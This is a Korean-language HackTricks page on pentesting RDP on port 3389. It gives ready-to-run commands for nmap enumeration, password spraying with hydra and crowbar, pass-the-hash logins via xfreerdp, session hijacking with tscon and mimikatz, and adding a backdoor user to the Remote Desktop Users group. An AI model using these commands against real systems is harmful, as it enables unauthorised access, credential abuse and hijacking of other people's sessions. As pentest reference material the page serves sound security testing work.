# 3389 - RDP Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team 전문가)로부터 AWS 해킹을 제로부터 전문가까지 배우세요</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
* **해킹 트릭을 공유하고 싶다면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 20개 이상의 도구 및 기능을 사용하여 어디서든 전체 펜테스트를 실행하십시오. 우리는 펜테스터를 대체하지 않습니다 - 사용자에게 시간을 돌려주기 위해 사용자 정의 도구, 탐지 및 공격 모듈을 개발하여 더 심층적으로 파고들고 쉘을 열고 즐길 수 있도록 합니다.

{% embed url="https://pentest-tools.com/" %}

## 기본 정보

Microsoft에서 개발된 **원격 데스크톱 프로토콜** (**RDP**)은 네트워크를 통해 컴퓨터 간의 그래픽 인터페이스 연결을 가능하게 하는 것을 목적으로 합니다. 이러한 연결을 설정하기 위해 사용자는 **RDP** 클라이언트 소프트웨어를 사용하며 동시에 원격 컴퓨터는 **RDP** 서버 소프트웨어를 운영해야 합니다. 이 설정을 통해 먼 컴퓨터의 데스크톱 환경을 원격 장치로 가져와 사용자가 로컬 장치에서 인터페이스를 제어하고 액세스할 수 있습니다.

**기본 포트:** 3389
```
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
## 열거

### 자동

{% code overflow="wrap" %}
```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
{% endcode %}

사용 가능한 암호화 및 DoS 취약점을 확인하고 (서비스에 DoS를 유발하지 않고) NTLM Windows 정보(버전)를 획득합니다.

### [무차별 대입 공격](../generic-methodologies-and-resources/brute-force.md#rdp)

**주의하세요, 계정이 잠길 수 있습니다**

### **비밀번호 스프레이**

**주의하세요, 계정이 잠길 수 있습니다**
```bash
# https://github.com/galkan/crowbar
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
# hydra
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### 알려진 자격 증명/해시를 사용하여 연결
```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp [/d:domain] /u:<username> /p:<password> /v:<IP>
xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:<IP> #Pass the hash
```
### 알려진 자격 증명을 RDP 서비스에 대해 확인하기

impacket의 rdp_check.py를 사용하면 특정 자격 증명이 RDP 서비스에 대해 유효한지 확인할 수 있습니다:
```bash
rdp_check <domain>/<name>:<password>@<IP>
```
<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 20가지 이상의 도구 및 기능을 사용하여 어디서든 전체 펜테스트를 실행하십시오. 우리는 펜테스터를 대체하지 않습니다 - 대신 사용자에게 시간을 돌려주기 위해 사용자 정의 도구, 탐지 및 악용 모듈을 개발하여 더 깊이 파고들고 쉘을 열고 즐길 수 있도록 합니다.

{% embed url="https://pentest-tools.com/" %}

## **공격**

### 세션 도용

**SYSTEM 권한**으로 **모든 사용자의 열린 RDP 세션에 액세스**할 수 있으며 소유자의 비밀번호를 알 필요가 없습니다.

**열린 세션 가져오기:**
```
query user
```
**선택된 세션에 액세스**
```bash
tscon <ID> /dest:<SESSIONNAME>
```
이제 선택한 RDP 세션 내부에 들어가 사용자를 위장해야 합니다. 이를 위해 Windows 도구와 기능만을 사용할 것입니다.

**중요**: 활성 RDP 세션에 액세스하면 해당 세션을 사용 중인 사용자를 로그아웃시킵니다.

프로세스 덤프를 통해 암호를 얻을 수도 있지만, 이 방법은 훨씬 빠르며 사용자의 가상 데스크톱과 상호 작용할 수 있게 해줍니다(디스크에 저장되지 않은 노트패드의 암호, 다른 기기에서 열린 다른 RDP 세션 등...)

#### **Mimikatz**

이를 수행하기 위해 mimikatz를 사용할 수도 있습니다:
```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```
### Sticky-keys & Utilman

이 기술을 **stickykeys** 또는 **utilman과 결합하면 관리자 CMD 및 어떤 RDP 세션에도 언제든지 액세스할 수 있습니다.**

이미 이러한 기술 중 하나로 백도어 처리된 RDP를 검색할 수 있습니다: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

### RDP 프로세스 주입

다른 도메인에서 누군가가 **더 나은 권한으로 RDP를 통해 로그인**하여 **관리자인 경우**, 그의 **RDP 세션 프로세스에 자신의 비콘을 주입**하고 그로서 그의 역할을 할 수 있습니다:

{% content-ref url="../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md" %}
[rdp-sessions-abuse.md](../windows-hardening/active-directory-methodology/rdp-sessions-abuse.md)
{% endcontent-ref %}

### RDP 그룹에 사용자 추가
```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```
## 자동 도구

* [**AutoRDPwn**](https://github.com/JoelGMSec/AutoRDPwn)

**AutoRDPwn**은 Powershell로 작성된 포스트 익스플로잇레이션 프레임워크로, 주로 Microsoft Windows 컴퓨터에서 **Shadow** 공격을 자동화하기 위해 설계되었습니다. 이 취약점은 (Microsoft에 의해 기능으로 명시된) 원격 공격자가 피해자의 데스크톱을 **동의 없이 볼 수 있게** 하며, 운영 체제 자체의 도구를 사용하여 필요에 따라 제어할 수 있게 합니다.

* [**EvilRDP**](https://github.com/skelsec/evilrdp)
* 명령 줄에서 마우스 및 키보드 제어를 자동화하는 방법
* 명령 줄에서 클립보드 제어를 자동화하는 방법
* 클라이언트에서 RDP를 통해 통신을 채널링하는 SOCKS 프록시 생성
* 파일을 업로드하지 않고 대상에서 임의의 SHELL 및 PowerShell 명령 실행
* 대상과 파일 전송이 비활성화된 경우에도 대상과 파일을 업로드하고 다운로드하기
```
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for RDP
Note: |
Developed by Microsoft, the Remote Desktop Protocol (RDP) is designed to enable a graphical interface connection between computers over a network. To establish such a connection, RDP client software is utilized by the user, and concurrently, the remote computer is required to operate RDP server software. This setup allows for the seamless control and access of a distant computer's desktop environment, essentially bringing its interface to the user's local device.

https://book.hacktricks.xyz/pentesting/pentesting-rdp

Entry_2:
Name: Nmap
Description: Nmap with RDP Scripts
Command: nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}
```
<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**취약점 평가 및 침투 테스트를 위한 즉시 사용 가능한 설정**. 20가지 이상의 도구 및 기능을 사용하여 어디서든 전체 펜테스트를 실행하십시오. 우리는 펜테스터를 대체하지 않습니다 - 대신 사용자에게 깊이 파고들고 쉘을 열고 즐길 시간을 돌려주기 위해 사용자 정의 도구, 탐지 및 악용 모듈을 개발합니다.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹을 배우세요</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식의 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 굿즈**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **HackTricks 및 HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유하세요**.

</details>
